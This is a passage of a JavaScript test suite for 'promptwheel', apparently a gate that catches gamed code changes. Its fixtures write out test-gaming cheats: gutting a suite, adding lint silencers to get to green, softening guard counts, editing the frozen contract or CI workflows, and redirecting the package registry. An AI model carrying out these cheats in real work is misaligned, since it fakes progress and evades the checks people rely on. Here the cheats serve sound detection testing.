  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, repeat: 2 }, null, 2) + '\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.mandates[0].name, 'contract-frozen');
  r = run('--allow', 'a person changed the contract');
  assert.equal(r.code, 0, r.out);
  rmSync(d, { recursive: true, force: true });
});

// A workflow change is ordinary upkeep (an action version bump, a new job): on 17 real repos 61 of 320 commits by
// people touched a protected path, nearly all of them a workflow. A rule with no way through but deleting the rule
// teaches people to delete the rule. So it takes a person's reason, like the contract's own file: by the flag, and on
// a pull request by a comment from someone who did not open it. Never by a commit message.
test('the preset: a workflow change takes a reason from a person, by the flag; a trailer does not clear it; the registry file stays frozen', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-wf-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { test: 'node -e 0' } }));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\njobs: {}\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const rule = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).mandates.find((m) => m.name === 'workflows-frozen');
  assert.equal(rule.allowable, 'flag', 'written into the contract, where a person can read it'); assert.match(rule.reason, /with a reason from a person \(--allow\)/);
  const run = (...extra) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...extra]); return { code: r.code, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\njobs: { a: { runs-on: ubuntu-latest, steps: [] } }\n'); commitAll(d, 'ci: a job');
  let r = run(); assert.equal(r.code, 1, 'with no reason it fails as before'); assert.equal(r.rep.mandates[0].name, 'workflows-frozen');
  assert.ok((r.rep.allowable || []).includes('mandate:workflows-frozen'), 'and the report says a reason would clear it');
  r = run('--allow', 'the CI job, reviewed'); assert.equal(r.code, 0, JSON.stringify(r.rep.allowed));
  assert.ok(r.rep.allowed.cleared.includes('mandate:workflows-frozen')); assert.match(r.rep.allowed.reason, /the CI job, reviewed/, 'the reason is on the record');
  g(['commit', '-q', '--amend', '-m', 'ci: a job\n\nPromptwheel-Allow: the CI job, reviewed']);
  assert.equal(run().code, 1, 'a commit message is not a person: a trailer does not clear a workflow change');
  writeFileSync(join(d, '.npmrc'), 'registry=https://example.invalid/\n'); commitAll(d, 'npmrc');
  r = run('--allow', 'registry-config-frozen: I want this'); assert.equal(r.code, 1, 'where packages come from keeps no way through but retiring its rule'); assert.equal(r.rep.mandates[0].name, 'registry-config-frozen');
  rmSync(d, { recursive: true, force: true });
});

// ---------------------- the newcomer's first cheat: gut the tests, metric stays flat
test('default init config: weakening the suite (flat metric) FAILS via tripwires', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-gut-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node --test"}}');
  writeFileSync(join(d, 'src.mjs'), 'export const add=(a,b)=>a+b;\n');
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test'; import assert from 'node:assert'; import {add} from './src.mjs';\ntest('a', () => assert.equal(add(1,2),3));\ntest('b', () => assert.equal(add(2,2),4));\n");
  assert.equal(pw(d, ['init']).code, 0);
  commitAll(d, 'base');
  // gut the suite: tests_pass stays 1 → 1, but assertions/test_count drop
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test';\ntest('trivial', () => {});\n");
  const r = pw(d, ['run', '--working', '--no-record']);
  assert.equal(r.code, 1, r.out);               // guarded tripwire regression, not a silent PASS
  assert.match(r.out, /FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------- config-level gamingThreshold flows through the gate
test('run --detect-gaming: gamingThreshold from config flips a half-retained win to GAMED', () => {
  const DONE = { name: 'done', cmd: 'grep -rho DONE . --include=*.js --include=*.mjs 2>/dev/null | wc -l', extract: 'number', direction: 'up', guard: true };
  const mk = (threshold) => {
    const d = tmpRepo([DONE]);
    if (threshold != null) {
      const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
      writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, gamingThreshold: threshold }));
    }
    writeFileSync(join(d, 'src.js'), '// start\n');
    writeFileSync(join(d, 'x.test.js'), '// tests\n');
    commitAll(d, 'base'); const base = rev(d);
    writeFileSync(join(d, 'src.js'), '// DONE\n');      // half the gain from source…
    writeFileSync(join(d, 'x.test.js'), '// DONE\n');   // …half from a test file
    commitAll(d, 'head');
    const r = pw(d, ['run', '--base', base, '--head', 'HEAD', '--detect-gaming', '--no-record']);
    rmSync(d, { recursive: true, force: true });
    return r;
  };
  assert.equal(mk(null).code, 0);                 // default 0.5: retained 0.5 → earned
  const r = mk(0.6);
  assert.equal(r.code, 2, r.out);                 // threshold 0.6: same change → GAMED
  assert.match(r.out, /GAMED/);
});

// ------------------------- corpus finding: the fake-green class (inert guard)
test('run: a guarded pass metric that never passes → INCONCLUSIVE (exit 3), never silent green', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'false', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'c1');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 3);                        // an inert guard verifies nothing, not a pass, not a regression
  assert.match(r.out, /INCONCLUSIVE/);
  assert.match(r.out, /"tests_pass" ran and failed before and after this change/);   // still names the specific broken guard
  assert.doesNotMatch(r.out, /never ran|build\/deps|promptwheel init/, 'a command that ran and failed gets no build advice');
  rmSync(d, { recursive: true, force: true });
});
test('run: the inert message says what happened: a command that could not run keeps the build/deps advice, in the terminal and in the PR comment', () => {
  const mk = (cmd) => {
    const d = tmpRepo([{ name: 'tests_pass', cmd, extract: 'exit', direction: 'pass', guard: true }]);
    writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'c1');
    const out = ['--no-record', '--json', '--markdown'].map((f) => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', f]));
    rmSync(d, { recursive: true, force: true });
    for (const r of out) assert.equal(r.code, 3, r.out);
    return { human: out[0].out, rep: reportOf(out[1].out), md: out[2].out };
  };
  const missing = mk('pw-no-such-test-runner --all');           // exit 127: the shell found no such command
  assert.match(missing.human, /"tests_pass" never ran \(same value at both refs\): its command needs a build\/deps first/);
  assert.equal(missing.rep.metrics[0].inert, true); assert.equal(missing.rep.metrics[0].ran, undefined);
  assert.match(missing.md, /it never runs/);
  const failing = mk('node -e "require(\'assert\').equal(1, 2)"');   // a test that plainly ran and failed
  assert.match(failing.human, /"tests_pass" ran and failed before and after this change/);
  assert.doesNotMatch(failing.human, /never ran|build\/deps/);
  assert.equal(failing.rep.metrics[0].inert, true); assert.equal(failing.rep.metrics[0].ran, 'both');
  assert.match(failing.md, /it fails before and after this change/); assert.doesNotMatch(failing.md, /never runs/);
  assert.equal(conformsToContract(failing.rep).ok, true);
});
test('run: a default run in a repo with no origin/main prints nothing from git', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'head');
  const r = spawnSync('node', [ENGINE, 'run'], { cwd: d, encoding: 'utf8' });   // no --base: origin/main, origin/master, main, master are tried
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, /improved/);
  assert.equal(r.stderr, '', 'no "fatal: Not a valid object name" lines');
  rmSync(d, { recursive: true, force: true });
});
test('run: the hint on a protected path says how to accept it: --allow for a rule that takes it, a change of its own for one that does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-hint-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  execFileSync('git', ['config', 'user.email', 't@t'], { cwd: d }); execFileSync('git', ['config', 'user.name', 't'], { cwd: d });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x' }));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/x.yml'), 'on: push\n');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  commitAll(d, 'contract');
  const f = join(d, 'promptwheel.config.json');
  writeFileSync(f, JSON.stringify({ ...JSON.parse(readFileSync(f, 'utf8')), repeat: 2 }, null, 2)); commitAll(d, 'edit the contract');
  let r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /"contract-frozen" accepts a person's declared reason: promptwheel run --allow "<reason>"/);
  assert.doesNotMatch(r.out, /retire the mandate/, 'the config is the protected path: "retire it in the config" is no way out');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--allow', 'more repeats']).code, 0);
  // a workflow change takes a reason too, since 0.8.10
  writeFileSync(join(d, '.github/workflows/x.yml'), 'on: [push, pull_request]\n');
  commitAll(d, 'edit a workflow');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /"workflows-frozen" accepts a person's declared reason: promptwheel run --allow "<reason>"/);
  assert.doesNotMatch(r.out, /retire the mandate/);
  // a NEW workflow file is also a change to the repo's shape, so its reason names both, and the hint gives the line
  writeFileSync(join(d, '.github/workflows/y.yml'), 'on: workflow_dispatch\n');
  commitAll(d, 'add a workflow');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /"workflows-frozen" accepts a person's declared reason: promptwheel run --allow "lock_drift, workflows-frozen: <reason>"/);
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--allow', 'a manual job']).code, 1, 'one reason, one thing');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--allow', 'lock_drift, workflows-frozen: a manual job']).code, 0);
  // where packages come from does not
  writeFileSync(join(d, '.npmrc'), 'registry=https://example.invalid/\n');
  commitAll(d, 'point at another registry');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /a mandate is a hard rule; if the change is truly intended, retire the mandate/);
  assert.doesNotMatch(r.out, /accepts a person's declared reason/);
  rmSync(d, { recursive: true, force: true });
});

test('run: an inert guard does NOT bury a real improvement elsewhere (keep the win + warn)', () => {
  const d = tmpRepo([
    { name: 'brokenguard', cmd: 'false',          extract: 'exit',   direction: 'pass', guard: true },   // inert: 0 at both refs
    { name: 'score',       cmd: 'cat score.txt',  extract: 'number', direction: 'up',   guard: true },
  ]);
  writeFileSync(join(d, 'score.txt'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'score.txt'), '9\n'); commitAll(d, 'improve');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0);                            // a real, measured win must NOT be discarded as inconclusive
  assert.match(r.out, /VERDICT: PASS/);
  assert.match(r.out, /"brokenguard" ran and failed before and after/);  // the inert guard is still surfaced as a warning
  rmSync(d, { recursive: true, force: true });
});

test('antihack tripwires exclude generated dirs, no artifact-drift false fire', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-artifact-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"true"}}');
  mkdirSync(join(d, 'src'));  writeFileSync(join(d, 'src', 'a.js'), 'assert(1)\n');                              // 1 real tracked assertion
  mkdirSync(join(d, 'dist')); writeFileSync(join(d, 'dist', 'a.js'), 'assert(2)\nassert(3)\nassert(4)\n');       // 3 in a BUILD dir the tests generate
  assert.equal(pw(d, ['init', '--preset', 'antihack']).code, 0);
  commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record', '--json']);
  const a = JSON.parse(r.out).metrics.find((m) => m.name === 'assertions');
  assert.ok(a.before <= 1, `assertions must exclude dist/ (counted ${a.before}, expected the 1 tracked-source assert only)`);
  rmSync(d, { recursive: true, force: true });
});

// ------------------- generalized measurement env: linkDirs + env({wt}) + per-ref setup
test('measure env: linkDirs symlink + env ({wt} substituted) + setup all reach the worktree', () => {
  const d = tmpRepo([{ name: 'x', cmd: 'true', extract: 'exit', direction: 'pass', guard: false }]);
  mkdirSync(join(d, 'deps')); writeFileSync(join(d, 'deps', 'marker.txt'), '5\n'); // uncommitted dep dir, must be symlinked in
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({
    linkNodeModules: false,
    linkDirs: ['deps'],
    env: { STAMP: '7', WT: '{wt}' },
    setup: 'echo $STAMP > built.txt; [ -d "$WT/deps" ] && echo 1 > wtok.txt',
    metrics: [
      { name: 'dep',   cmd: 'cat deps/marker.txt', extract: 'number', direction: 'up', guard: false },
      { name: 'built', cmd: 'cat built.txt',        extract: 'number', direction: 'up', guard: false },
      { name: 'wtok',  cmd: 'cat wtok.txt',         extract: 'number', direction: 'up', guard: false },
    ],
  }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'head');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  const after = (n) => JSON.parse(r.out).metrics.find((m) => m.name === n).after;
  assert.equal(after('dep'), 5);    // linkDirs symlinked deps/ into the worktree
  assert.equal(after('built'), 7);  // setup ran in the worktree; env STAMP reached it
  assert.equal(after('wtok'), 1);   // {wt} was substituted to the real worktree path
  rmSync(d, { recursive: true, force: true });
});

test('init: a Python stack auto-writes venv linkDirs + PYTHONPATH (so tests_pass is not structurally inert)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-pyinit-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "x"\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.deepEqual(cfg.linkDirs, ['.venv']);
  assert.match(cfg.env.PYTHONPATH, /\{wt\}/);
  // no install step: the venv is linked into each clean copy, so `pip install -e .` there re-pointed the developer's
  // own editable install at a folder the check then deleted (6 of 8 real repos could no longer import their package)
  assert.equal(cfg.setup, undefined, 'init writes no setup for a Python repo');
  rmSync(d, { recursive: true, force: true });
});
// The setup `init` wrote for Python until 0.8.7 ran pip in each clean copy against the linked venv. A config that
// still holds that exact line must not run it. A stand-in pip on PATH says whether it was called.
test('a config that still holds the old Python setup line does not run pip against the linked venv; another setup still runs', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-pysetup-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const bin = mkdtempSync(join(tmpdir(), 'pw-pybin-')), mark = join(bin, 'called');
  writeFileSync(join(bin, 'pip'), `#!/bin/sh\necho "$@" >> "${mark}"\n`, { mode: 0o755 });
  const cfg = (setup) => writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, linkDirs: ['.venv'], env: { PYTHONPATH: '{wt}/src:{wt}' }, setup, metrics: [{ name: 'tests_pass', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }] }));
  cfg('pip install -e . --quiet 2>/dev/null || true');
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "x"\n'); writeFileSync(join(d, '.gitignore'), '.promptwheel/\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'a change');
  const run = () => { try { return execFileSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json'], { cwd: d, encoding: 'utf8', env: { ...process.env, PATH: `${bin}:${process.env.PATH}` } }); } catch (e) { return `${e.stdout || ''}${e.stderr || ''}`; } };
  assert.equal(reportOf(run()).verdict, 'pass');
  assert.equal(existsSync(mark), false, 'the old line is left alone: pip was not run');
  // a setup the person wrote is theirs and still runs
  cfg('pip install -e . --no-deps'); commitAll(d, 'my own setup'); writeFileSync(join(d, 'note.txt'), 'y'); commitAll(d, 'another change');
  run();
  assert.equal(existsSync(mark), true, 'any other setup command runs as written');
  rmSync(d, { recursive: true, force: true }); rmSync(bin, { recursive: true, force: true });
});

test('init: package.json WITHOUT a test script gets the self-describing placeholder', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-nots-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x"}');   // no scripts.test
  writeFileSync(join(d, 'a.js'), '1\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.match(cfg.metrics.find((m) => m.name === 'tests_pass').cmd, /set your test command/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------- corpus finding: suppression tripwire must cover go + rust
test('suppressions tripwire counts //nolint (go) and #![allow] (rust) too', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sup-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'a.go'), 'package a\n//nolint:all\n');
  writeFileSync(join(d, 'b.rs'), '#![allow(dead_code)]\n');
  writeFileSync(join(d, 'c.js'), '// eslint-disable-next-line\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cmd = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'))
    .metrics.find((m) => m.name === 'suppressions').cmd;
  const n = execFileSync('bash', ['-c', cmd], { cwd: d, encoding: 'utf8' }).trim();
  assert.equal(n, '3');
  rmSync(d, { recursive: true, force: true });
});

test('skipped-tests tripwire: a call to exit( is not a skipped test (contract-replay 2026-11-12: micromark read 400 "skips", every one an effects.exit( call, and a commit that added one was sent back)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-xit-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'a.js'), 'effects.exit(type)\nprocess.exit(1)\nif (bad) { exit(2) }\n');
  writeFileSync(join(d, 'b.py'), 'import sys\nsys.exit(0)\n');
  writeFileSync(join(d, 'c.test.js'), "xit('later', () => {})\nit.skip('also later', () => {})\ndescribe.only('this one', () => {})\n  xit ('spaced', () => {})\n");
  writeFileSync(join(d, 'd_test.py'), '@pytest.mark.skip\ndef test_x(): pass\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cmd = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.find((m) => m.name === 'skipped_tests').cmd;
  assert.equal(execFileSync('bash', ['-c', cmd], { cwd: d, encoding: 'utf8' }).trim(), '5', 'two xit, one .skip, one .only, one pytest skip; none of the four exit( calls');
  rmSync(d, { recursive: true, force: true });
});

test('default init config: one more lint silencer is a note, not a send-back (contract-replay 2026-11-12: 13 of 17 count send-backs on real commits were a person adding eslint-disable, #[allow] or //nolint in ordinary work); a gutted suite still fails', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-note-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node --test"}}');
  writeFileSync(join(d, 'src.mjs'), 'export const add=(a,b)=>a+b;\n');
  const TESTS = "import {test} from 'node:test'; import assert from 'node:assert'; import {add} from './src.mjs';\ntest('a', () => assert.equal(add(1,2),3));\ntest('b', () => assert.equal(add(2,2),4));\n";
  writeFileSync(join(d, 'x.test.mjs'), TESTS);
  assert.equal(pw(d, ['init']).code, 0);
  const sup = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.find((m) => m.name === 'suppressions');
  assert.equal(sup.report, 'no-win', 'init writes the silencer count as a note for a change that wins nothing');
  assert.equal(sup.guard, true, 'still a guard by kind, so a later edit that turns it off is seen');
  commitAll(d, 'base');
  // ordinary work: one more test, with the lint silencer the repo's own style asks for
  writeFileSync(join(d, 'x.test.mjs'), TESTS + "test('c', async () => { for (const n of [1, 2]) { await null; assert.equal(add(n, 0), n); } }); // eslint-disable-line no-await-in-loop\n");
  commitAll(d, 'one more test');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']);
  assert.equal(r.code, 0, r.out);
  const rep = reportOf(r.out);
  assert.equal(rep.verdict, 'pass');
  const m = rep.metrics.find((x) => x.name === 'suppressions');
  assert.equal(m.status, 'regressed'); assert.equal(m.noted, true, 'shown as a note');
  // the same repo with the suite gutted still fails: the other three counts stay guards
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test';\ntest('trivial', () => {});\n");
  commitAll(d, 'gut');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto']).code, 1);
  rmSync(d, { recursive: true, force: true });
});

// The cheat the silencer count exists for: the check is red on a lint error, and the change silences the rule to get to
// green. A plain note would wave it through, because the silencer is in a source file and so "survives" the source-only
// re-run. On 340 real commits a silencer never arrived with anything getting better (17 of 17), so the rule is: a note
// when nothing else got better in the same change, sent back when something did.
test('default init config: a lint silencer that arrives with a green it could have bought is still sent back; the same line with nothing won is a note', () => {
  const LINT = "const bad = require('fs').readFileSync('src.js', 'utf8').split('\\n').filter((l) => /\\bvar\\b/.test(l) && !/eslint-disable/.test(l)); process.exit(bad.length ? 1 : 0);\n";
  const mk = (src) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-nowin-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node lint.js"}}');
    writeFileSync(join(d, 'lint.js'), LINT); writeFileSync(join(d, 'src.js'), src);
    assert.equal(pw(d, ['init']).code, 0);
    assert.equal(JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.find((m) => m.name === 'suppressions').report, 'no-win');
    commitAll(d, 'base'); return d;
  };
  const run = (d) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']); return { code: r.code, rep: reportOf(r.out) }; };
  // red on a lint error; the change silences it
  let d = mk('var x = 1;\nmodule.exports = x;\n');
  writeFileSync(join(d, 'src.js'), 'var x = 1; // eslint-disable-line no-var\nmodule.exports = x;\n'); commitAll(d, 'make it green');
  let r = run(d);
  assert.equal(r.rep.metrics.find((m) => m.name === 'tests_pass').status, 'improved');
  assert.notEqual(r.code, 0, JSON.stringify(r.rep.metrics)); assert.notEqual(r.rep.verdict, 'pass');
  const sup = r.rep.metrics.find((m) => m.name === 'suppressions'); assert.equal(sup.ok, false); assert.notEqual(sup.noted, true);
  // the real fix for the same red is earned
  d = mk('var x = 1;\nmodule.exports = x;\n');
  writeFileSync(join(d, 'src.js'), 'const x = 1;\nmodule.exports = x;\n'); commitAll(d, 'fix');
  r = run(d); assert.equal(r.rep.verdict, 'pass');
  // green before and after: the same silencer on a new line buys nothing, so it is a note
  d = mk('const x = 1;\nmodule.exports = x;\n');
  writeFileSync(join(d, 'src.js'), 'const x = 1;\nvar y = 2; // eslint-disable-line no-var\nmodule.exports = x + y;\n'); commitAll(d, 'more code');
  r = run(d); assert.equal(r.code, 0, JSON.stringify(r.rep.metrics)); assert.equal(r.rep.metrics.find((m) => m.name === 'suppressions').noted, true);
  // turning the conditional note into an unconditional one in the same change as the cheat does not help
  d = mk('var x = 1;\nmodule.exports = x;\n');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, metrics: c.metrics.map((m) => (m.name === 'suppressions' ? { ...m, report: true } : m)) }, null, 2));
  writeFileSync(join(d, 'src.js'), 'var x = 1; // eslint-disable-line no-var\nmodule.exports = x;\n'); commitAll(d, 'make it green, and soften the count');
  r = run(d); assert.notEqual(r.rep.verdict, 'pass', JSON.stringify(r.rep.gate));
});

test('a change that turns a blocking count into a note and guts the suite in the same commit is not a pass (the README says a note is still a guard to the integrity check)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-note2-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node --test"}}');
  writeFileSync(join(d, 'src.mjs'), 'export const add=(a,b)=>a+b;\n');
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test'; import assert from 'node:assert'; import {add} from './src.mjs';\ntest('a', () => assert.equal(add(1,2),3));\ntest('b', () => assert.equal(add(2,2),4));\n");
  assert.equal(pw(d, ['init']).code, 0);
  commitAll(d, 'base');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, metrics: c.metrics.map((m) => (['assertions', 'test_count'].includes(m.name) ? { ...m, report: true } : m)) }, null, 2));
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test';\ntest('trivial', () => {});\n");
  commitAll(d, 'notes, and a gutted suite');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']);
  assert.notEqual(r.code, 0, r.out);
  assert.notEqual(reportOf(r.out).verdict, 'pass');
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------- self-heal: orphaned worktrees from a crashed run
// mirrors the engine's owner tag: sha1 of the repo's real path, first 8 hex chars
const ownerTag = (repo) => createHash('sha1').update(realpathSync(repo)).digest('hex').slice(0, 8);
// the gate with a private temp dir, so a self-heal test never reads or removes a name in the shared one.
// Fixture names end in 6 letters or digits, as mkdtemp names them: self-heal removes no other shape.
const pwTmp = (tmp, d, args) => {
  try { return { out: execFileSync('node', [ENGINE, ...args], { cwd: d, encoding: 'utf8', env: { ...process.env, TMPDIR: tmp } }), code: 0 }; }
  catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; }
};
test('a read-only system temp folder (a sandboxed agent, a locked-down runner) does not stop the gate: it measures inside .git', () => {
  const ro = mkdtempSync(join(tmpdir(), 'pw-ro-')); chmodSync(ro, 0o555);
  const d = tmpRepo([TODOS]); writeFileSync(join(d, 'a.js'), '// TODO one\n'); commitAll(d, 'base'); writeFileSync(join(d, 'a.js'), '// done\n'); commitAll(d, 'fix');
  const before = execFileSync('git', ['status', '--porcelain'], { cwd: d, encoding: 'utf8' }).trim();
  try {
    const r = pwTmp(ro, d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
    assert.ok(!/EROFS|EACCES|mkdtemp|cannot write/.test(r.out), r.out); assert.match(r.out, /todos/, 'it measured');
    assert.ok(existsSync(join(d, '.git', 'promptwheel-tmp')), 'the clean copies went under .git');
    assert.equal(execFileSync('git', ['status', '--porcelain'], { cwd: d, encoding: 'utf8' }).trim(), before, 'git status shows nothing new');
  } finally { chmodSync(ro, 0o755); rmSync(ro, { recursive: true, force: true }); rmSync(d, { recursive: true, force: true }); }
});
test('a sandboxed shell where both the temp folder and .git are read-only gets one plain sentence, not a stack', () => {
  const ro = mkdtempSync(join(tmpdir(), 'pw-ro2-')); chmodSync(ro, 0o555);
  const d = tmpRepo([TODOS]); writeFileSync(join(d, 'a.js'), '// TODO one\n'); commitAll(d, 'base'); writeFileSync(join(d, 'a.js'), '// done\n'); commitAll(d, 'fix'); const gd = join(d, '.git'); const pt = join(gd, 'promptwheel-tmp'); mkdirSync(pt); chmodSync(pt, 0o555);
  try { const r = pwTmp(ro, d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']); assert.match(r.out, /this shell cannot write a temp folder or \.git/); assert.ok(!/at mkdtempSync/.test(r.out), 'no stack'); }
  finally { chmodSync(ro, 0o755); chmodSync(pt, 0o755); rmSync(ro, { recursive: true, force: true }); rmSync(d, { recursive: true, force: true }); }
});
test('self-heal: a stale /tmp worktree from a crashed run is cleaned on the next run; an untagged dir is never removed', () => {
  const tmp = mkdtempSync(join(tmpdir(), 'pw-heal-'));
  const d = tmpRepo([TODOS]);
